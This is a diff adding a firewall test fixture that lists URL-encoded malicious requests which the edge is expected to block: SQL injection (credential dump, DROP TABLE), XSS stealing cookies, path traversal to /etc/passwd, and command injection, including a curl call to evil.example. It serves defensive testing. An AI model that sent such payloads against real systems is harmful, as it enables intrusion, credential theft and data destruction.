@@ -1,0 +1,16 @@
+# TC-SEC-01 firewall payload list (Section 13.2). One request per line:
+# <id>	<method>	<path and query, already URL-encoded>
+# Every line must be answered with 403 by the edge and logged as WAF_BLOCK.
+# Run: edge/scripts/waf-test.sh [base-url]
+SQLI-01	GET	/api/employees?q=%27%20OR%20%271%27%3D%271
+SQLI-02	GET	/api/employees?q=1%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--
+SQLI-03	GET	/api/employees?deptNo=d005%27%3B%20DROP%20TABLE%20employees%3B--
+SQLI-04	GET	/api/employees?q=%27%20AND%20SLEEP(5)--
+XSS-01	GET	/api/employees?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+XSS-02	GET	/api/employees?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+XSS-03	GET	/?next=javascript%3Aalert(document.cookie)
+TRAV-01	GET	/api/documents?title=..%2F..%2F..%2Fetc%2Fpasswd
+TRAV-02	GET	/static/..%252f..%252f..%252fetc%252fpasswd
+TRAV-03	GET	/api/employees?q=%2Fproc%2Fself%2Fenviron
+CMD-01	GET	/api/employees?q=%3Bcat%20%2Fetc%2Fpasswd
+CMD-02	GET	/api/employees?q=%24(curl%20http%3A%2F%2Fevil.example)
